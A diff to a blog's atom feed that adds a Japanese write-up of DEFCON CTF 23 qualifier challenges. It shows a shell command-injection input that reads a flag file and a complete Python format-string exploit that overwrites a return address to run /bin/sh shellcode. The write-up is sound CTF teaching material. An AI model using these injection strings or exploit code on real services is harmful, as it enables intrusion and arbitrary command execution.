@@ -4,7 +4,7 @@
   <title><![CDATA[Category: ctf | 犬アイコンのみっきー]]></title>
   <link href="http://mzyy94.com/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://mzyy94.com/"/>
-  <updated>2015-05-07T19:38:51+09:00</updated>
+  <updated>2015-05-18T23:43:54+09:00</updated>
   <id>http://mzyy94.com/</id>
   <author>
     <name><![CDATA[mzyy94]]></name>
@@ -12,6 +12,614 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[DEFCON CTF 23予選Write-up]]></title>
+    <link href="http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup/"/>
+    <updated>2015-05-18T23:45:04+09:00</updated>
+    <id>http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup</id>
+    <content type="html"><![CDATA[<p>今年のDEFCON CTFの予選が5月16日午前9時から48時間開催されていました。今回はチーム********としての参加ではなく、Team ENUに派遣される形で参加してきました。</p>
+
+<p>今年は、比較的やさしいBaby&#8217;s First問題とPwn問題、リバースエンジニアリングのジャンルに属する問題が各数問あり、加えてWebとコーディングチャレンジが1問ずつありました。
+複数ある問題の中でFlagをsubmitしたのは1問だけですが、いくつか正解までたどり着くところまで解けたのでWrite-upを記します。</p>
+
+<!-- more -->
+
+
+<h1>Babycmd</h1>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: 
+</code></pre>
+
+<p>pingとhostとdigコマンドが実行できるアプリケーションにアクセスして、どうにかしてflagを獲得する問題。
+逆アセンブルした結果、<em>コマンド[スペース]引数</em>として標準入力から渡すと、コマンドが( dig | ping | host | exit | help )かどうかで分岐し、引数が適切であるか、またIPアドレスかどうかをチェックし、コマンドをpopen経由で実行しているものでした。
+各コマンドは、引数がIPアドレスなのかそれ以外かで分岐し、</p>
+
+<table>
+<thead>
+<tr>
+<th>タイプ </th>
+<th> 実行コマンド</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dig (IPアドレス）</td>
+<td> <code>dig -x 引数</code></td>
+</tr>
+<tr>
+<td>dig（文字列）</td>
+<td><code>dig '引数'</code></td>
+</tr>
+<tr>
+<td>ping（IPアドレスのみ）</td>
+<td><code>ping -c 3 -W 3 引数</code></td>
+</tr>
+<tr>
+<td>host（IPアドレス）</td>
+<td><code>host 引数</code></td>
+</tr>
+<tr>
+<td>host（文字列）</td>
+<td><code>host "引数"</code></td>
+</tr>
+</tbody>
+</table>
+
+
+<p>としてpopenで実行されるようになっていました。</p>
+
+<p>適当にPublic DNS宛にPingを送ってみると以下のような表示になりました。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: ping 8.8.8.8
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_req=1 ttl=128 time=9.51 ms
+64 bytes from 8.8.8.8: icmp_req=2 ttl=128 time=9.53 ms
+64 bytes from 8.8.8.8: icmp_req=3 ttl=128 time=9.95 ms
+
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 received, 0 0x7fffd2999630acket loss, time 2005ms
+rtt min/avg/max/mdev = 9.515/9.667/9.956/0.219 ms
+Commands: ping, dig, host, exit
+:
+</code></pre>
+
+<p>pingの出力結果に含まれる<strong>% Packet</strong>が、フォーマット文字列の<em>%p</em>として解釈され、アドレスが表示されていることがわかりました。format string attackとして攻められるような感じがしましたが、他の人が取り組んでいるようなので違う方法でアプローチをしていくことにしました。</p>
+
+<p>digとhostに文字列を渡した時の括りがそれぞれ違うことに注目しました。digではシングルクオートで、hostではダブルクオートでくくって引数を渡しています。
+シェル上では、ダブルクオートの文字列の中で変数を展開できます。<code>echo "$SHELL"</code>とすると<em>/bin/bash</em>と出力されるのがいい例です。今回の問題の場合は、<code>host $SHELL</code>として標準入力から渡すと、<code>host "/bin/bash"</code>として実行されると考えられます。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: host $PWD
+Invalid hostname.
+Commands: ping, dig, host, exit
+:
+</code></pre>
+
+<p>しかしながら、試しに<code>host $PWD</code>として打ってみたところ、引数チェックで引っかかり、<em>popen</em>で実行されませんでした。</p>
+
+<p>逆コンパイルの結果、引数チェックでは最初と最後の文字が数字もしくはアルファベットでない場合にエラーとして実行させないようにしていることがわかったので、<code>host A${PWD}A</code>として実行してみました。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: host $PWD
+Invalid hostname.
+Commands: ping, dig, host, exit
+: host A${PWD}A
+Host A/A not found: 3(NXDOMAIN)
+Commands: ping, dig, host, exit
+:
+</code></pre>
+
+<p>変数展開されていることが確認できました。/ディレクトリがカレントディレクトリのようです。</p>
+
+<p>これができることがわかると、次に挑戦したくなるのはコマンド結果の展開です。
+ダブルクオート中に変数を展開する要領で、<em>$(コマンド)</em>としてコマンドを実行し、文字列中に出力を展開するものです。例として、<code>echo "$(uname)"</code>とすると<em>Linux</em>と返ってきます。これを用いて実行中のユーザーを確認します。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: host A$(whoami)A
+Host AbabycmdA not found: 3(NXDOMAIN)
+Commands: ping, dig, host, exit
+:
+</code></pre>
+
+<p>babycmdユーザーとして実行されていることがわかりました。
+そこで、ホームディレクトリ内のファイル一覧を取得してみることにしました。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: host A$(ls /home/babycmd)A
+sh: 1: ls/home/babycmd: not found
+Host AA not found: 3(NXDOMAIN)
+Commands: ping, dig, host, exit
+:
+</code></pre>
+
+<p>引数に渡される文字列に含まれるスペースが削られるようです。タブで代用してみました。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+: host A$(ls    /home/babycmd)A
+Host Ababycmd
+flagA not found: 3(NXDOMAIN)
+Commands: ping, dig, host, exit
+</code></pre>
+
+<p>ホームディレクトリにbabycmdとflagというファイルがあることがわかりました。
+catのリダイレクトでflagを抜いてしまいます。</p>
+
+<pre><code>Welcome to another Baby's First Challenge!
+Commands: ping, dig, host, exit
+:  host A$(cat&lt;/home/babycmd/flag)A
+Host AThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??A not found: 3(NXDOMAIN)
+Commands: ping, dig, host, exit
+:
+</code></pre>
+
+<p>FLAG:<code>Pretty easy eh!!~ Now let's try something hArd3r, shallwe??</code></p>
+
+<h1>Babyecho</h1>
+
+<pre><code>Reading 13 bytes
+</code></pre>
+
+<p>標準入力で待ち受けしているので、文字列を送ると<del>そのまま</del>標準出力に的確に返してくれるプログラムにアクセスしてflagを得る問題です。</p>
+
+<pre><code>Reading 13 bytes
+%p.%p.%p.%p
+0xd.0xa.(nil).0xd
+Reading 13 bytes
+0123456789abcdef
+0123456789ab
+Reading 13 bytes
+def
+Reading 13 bytes
+</code></pre>
+
+<p>フォーマット文字列が使えて、12文字を越えると次の入力として処理されるようです。</p>
+
+<p>バイナリを<code>strings</code>コマンドでみてみると、入力待ちの直前に表示されている<em>Reading 13 bytes</em>の13という数字は可変であることがわかります。</p>
+
+<pre><code>$ strings ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d | grep Reading
+Reading %d bytes
+</code></pre>
+
+<p>フォーマット文字列を使ってスタックの中身をもうすこしみてみます。</p>
+
+<pre><code>Reading 13 bytes
+AAAA%5$p
+AAAA0xffea839c
+Reading 13 bytes
+AAAA%6$p
+AAAA(nil)
+Reading 13 bytes
+AAAA%7$p
+AAAA0x41414141
+Reading 13 bytes
+</code></pre>
+
+<p><em>AAAA%7$p</em>を渡した状態の時、以下のようにスタック(esp)に積まれていることがわかります。</p>
+
+<p><svg width="300" height="400">
+<g class="block" transform="translate(80,20)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x????????</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,60)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,100)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,140)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,180)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,220)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,260)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,300)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x41414141</tspan>
+</text>
+</g>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
+</svg></p>
+
+<p>esp+0x1cの位置から標準入力の値の格納バッファーが確保されているようです。</p>
+
+<p>先ほど調査したスタックをみてみると、読み込みバイト数らしき13(=0x0000000d)が2箇所積まれているのがわかります。
+IDA pro (demo)で入力待ちになるときの直前の処理を追ってみます。</p>
+
+<p><img src="/blog/resources/images/2015/05/18/babyecho-debugging.png" alt="IDA pro demo debugging" /></p>
+
+<p>この入力と出力を繰り返すループ(0x08048FB6)の直前の処理で、サイズ0x420のスタックを用意し、スタック内の値をいくつかセットしているところがあります。この値のセットで、esp+0x14にesp+0x1cのアドレスをセットしている部分があります(0x08048f57)。esp+0x1cは、先ほどの調査より標準入力の値が格納されるバッファーの開始位置です。このことから、先ほど<em>AAAA%5$p</em>を入力して返ってきた値<em>0xffea839c</em>は、標準入力からの値を格納するバッファーのアドレスを指しているということになります。</p>
+
+<p>loc_8048fb6のループを見てみると、&#8221;Reading %d bytes\n&#8221;で表示されるバイト数をesp+0x10からesp+0x04にコピーしている処理があります(0x08048fcc)。printfで&#8221;Reading %d bytes\n&#8221;を表示した後、 esp+0x08に0x0aを入れ、標準入力からの読み取り上限をesp+0x10からesp+0x04にコピーしてセットし、esp+0x1cに標準入力からの値を読み取っています。</p>
+
+<p><svg width="640" height="400">
+<g class="block" transform="translate(80,20)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x????????</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,60)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,100)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,140)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,180)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,220)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,260)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,300)">
+<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
+</g>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,80)">&#8220;Reading %d bytes\n&#8221;で表示される数字</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,120)">定数(0x0a)</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,160)">定数(null)</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,200)">バッファーに読み込むバイト数</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,240)">バッファーの開始アドレス</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,280)">定数(null)</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(310,340)">バッファー領域</text>
+</svg></p>
+
+<p>これらの調査をもとに、バッファーに読み込むバイト数が格納されているesp+0x10の値を、esp+0x14に格納されているesp+0x1cのアドレスをもとに書き換え、読み込むバイト数の上限を書き換えて、攻撃コードを送り込む余地をつくる作戦が考えられます。
+アプローチとしては以下の図のようになります。</p>
+
+<p><svg width="640" height="400">
+<defs>
+<marker id="arrowhead" refX="2" refY="5" markerWidth="10" markerHeight="10" orient="auto">
+<path d="M 0,0 V 10 L10,5 Z" fill="black"></path>
+</marker>
+</defs>
+<g class="block" transform="translate(80,20)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x????????</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,60)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,100)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,140)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,180)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="red" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x0000040d</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,220)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">addr_buf</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,260)">
+<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
+</rect>
+<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
+<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
+</text>
+</g>
+<g class="block" transform="translate(80,300)">
+<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
+<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
+</g>
+<g class="arrow" transform="translate(260,240)">
+<path stroke="#000000" fill="none" d="M0,0h40v60h-12" marker-end="url(#arrowhead)" stroke-width="1" />
+</g>
+<g class="arrow" transform="translate(280,190)">
+<path stroke="#000000" fill="none" d="M0,110h95v-110h-87" marker-end="url(#arrowhead)" stroke-width="1" />
+</g>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
+<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,380)">+0x420</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,40)">1. バッファーのアドレスを取得</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,80)">2. バイト数格納位置の1バイト上位へ移動</text>
+<text class="comment" text-anchor="start" fill="black" dy=".35em" transform="translate(300,120)">3. その位置へ入力文字列長を格納</text>
+<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(310,270)">%5$10p</text>
+<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(380,240)">addr_buf - 0xb</text>
+<text class="address" text-anchor="start" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(290,205)">%7$ln</text>
+</svg></p>
+
+<p>13バイト制限のため、2回に分けてこの方法を試行します。
+まず1回目に、<strong>%5$10p</strong>と入力することによって、esp+10に格納されているバッファーのアドレスを取得します。</p>
+
+<p>そのアドレスから0x0bを引くことによって、バッファーの読み込みバイト数が格納されているアドレスの1バイト上位のアドレスを計算します。
+これは、一度に送ることができる文字数が制限されていることによって、<strong>自由に大きな数値を指定できないため、</strong>バッファーのバイト数格納位置の1バイト上位に文字列長を書き込む方法をとったためです。今回の最大13バイトの入力という制限下では、最大でも7までしか数値をしていできません。7をそのままバッファー読み込みバイト数に格納しても、現状の13バイトより減ってしまいます。そのため、書き込む位置を上位にずらすことで、結果的にその数値をビットシフトによる掛け算で大きくし、バイト数制限の値を拡張しています。</p>
+
+<p>そして2回目の入力時に、先ほど計算したアドレスへ文字数である4を、%nフォーマット文字列を使って書き込みます。これによって、現在0x0000000bとなっている読み込みバイト数を、0x0000040bに書き換えることができます。</p>
+
+<p>コードは以下のようになります。</p>
+
+<pre><code class="python">#!/usr/bin/env python
+
+import sys
+import socket
+import struct
+
+HOST = 'localhost' # 'babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me'
+PORT = 3232
+
+s = socket.create_connection((HOST, PORT))
+
+def exploit():
+    index = 7 # index of read/write buffer
+
+    print(s.recv(8192))
+    s.send("%5$10p\n") # request buffer address
+
+    addr_buf = int(s.recv(10), 16)
+    print("[DEBUG] Buffer address = 0x%x" % addr_buf)
+
+    code = struct.pack('&lt;I', (addr_buf - 0xb)) # address[buffer size limit] &lt;&lt; 8
+    code += "%%%d$ln\n" % index # write message text length = 4
+
+    s.recv(8192)
+    s.send(code) # overwrite buffer
+
+    s.recv(8192)
+    print(s.recv(8192))
+
+if __name__=='__main__':
+    exploit()
+</code></pre>
+
+<p>実行してみると、以下のようになりました。</p>
+
+<pre><code>Reading 13 bytes
+
+[DEBUG] Buffer address = 0xffbf62bc
+
+Reading 1023 bytes
+</code></pre>
+
+<p>1度にバッファーに読み込み可能な文字数の上限が変化しました。esp+0x10の値は、esp+0x11に4を書き込んだことから、0x0000040d、すなわち1037になっていますが、ループを繰り返すたび値のチェックがあり、1023を超える場合は1023に描き戻されているので、上限が1023 bytesになりました。</p>
+
+<p>これだけあれば、shellcodeを送り込んで実行させることができます。サブルーチンコールの呼び出し元であるリターンアドレスを書き換え、shellcodeを実行させてフラッグを獲得しに行きます。</p>
+
+<pre><code class="python">#!/usr/bin/env python
+
+import sys
+import socket
+import struct
+
+HOST = 'localhost' # 'babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me'
+PORT = 3232
+
+s = socket.create_connection((HOST, PORT))
+
+def exploit():
+    index = 7 # index of read/write buffer
+
+    print(s.recv(8192))
+    s.send("%5$10p\n") # request buffer address
+
+    addr_buf = int(s.recv(10), 16)
+    print("[DEBUG] Buffer address = 0x%x" % addr_buf)
+
+    code = struct.pack('&lt;I', (addr_buf - 0xb)) # address[buffer size limit] &lt;&lt; 8
+    code += "%%%d$ln\n" % index # write message text length = 4
+
+    s.recv(8192)
+    s.send(code) # overwrite buffer
+
+    s.recv(8192)
+    print(s.recv(8192))
+
+    # x86 /bin/sh shellcode
+    shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+    addr_ret = addr_buf - 0x20  # call return address = [esp]
+
+    payload = struct.pack('&lt;I', addr_ret) \
+    + struct.pack('&lt;I', addr_ret + 1) \
+    + struct.pack('&lt;I', addr_ret + 2) \
+    + struct.pack('&lt;I', addr_ret + 3) \
+    + shellcode
+
+    addr_shell = [
+    addr_buf + 16 &gt;&gt; 0  &amp; 0xff,
+    addr_buf + 16 &gt;&gt; 8  &amp; 0xff,
+    addr_buf + 16 &gt;&gt; 16 &amp; 0xff,
+    addr_buf + 16 &gt;&gt; 24 &amp; 0xff ]
+
+    payload += "%%%dc%%%d$hhn" % ((addr_shell[0] - len(payload)) &amp; 0xff, index) \
+    + "%%%dc%%%d$hhn" % ((addr_shell[1] - addr_shell[0]) &amp; 0xff, index + 1) \
+    + "%%%dc%%%d$hhn" % ((addr_shell[2] - addr_shell[1]) &amp; 0xff, index + 2) \
+    + "%%%dc%%%d$hhn" % ((addr_shell[3] - addr_shell[2]) &amp; 0xff, index + 3) \
+    + "\n"
+
+    s.send(payload) # exploit
+
+    s.send("cat&lt;/home/babyecho/flag\n") # capture the flag
+    print(s.recv(8192))
+    print(s.recv(8192))
+
+if __name__=='__main__':
+    exploit()
+</code></pre>
+
+<p>実行結果は以下のとおりです。</p>
+
+<pre><code>Reading 13 bytes
+
+[DEBUG] Buffer address = 0xffbf62bc
+
+Reading 1023 bytes
+
+彙ｿ…拊ｿ…枌ｿ…歟ｿ…jX儚h//shh/bin峨1ﾉﾍ\                                                                                                                                                                      …                                                                                                                                                     
+                                                                                                                                                           …
+The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
+</code></pre>
+
+<p>FLAG:<code>1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
+</code></p>
+
+<h1>その他</h1>
+
+<p>Codingchallengeという、とあるレジスタの初期状態と機械語の命令コードが送られてきて、その命令を実行した結果を送り返すという問題も解いたのですが、違う問題でglibcのアップデートをした際にマシンがクラッシュし、スナップショットの状態に戻した際に消えてしまいました。
+なのでコードがありません。</p>
+
+<p>解法としては、Pythonで以下のように処理するものを作成して実行しただけです。</p>
+
+<ol>
+<li>レジスタの初期状態と機械語命令コードを受信＆パースする</li>
+<li>Cのソースコードを生成
+
+<ol>
+<li>命令コードをunsigned char型配列に突っ込む</li>
+<li>その配列を関数ポインタに変換</li>
+<li>mprotectで配列の領域を実行可能に変更</li>
+<li>asm volatile経由でレジスタの初期状態を書き込む</li>
+<li>関数ポインタを呼び出し実行</li>
+<li>ams volatile経由で実行後のレジスタの値を読み出す</li>
+<li>標準出力に出力</li>
+</ol>
+</li>
+<li>gccでソースコードをコンパイル</li>
+<li>生成したバイナリを実行し、出力を得る</li>
+<li>出力を送信</li>
+</ol>
+
+
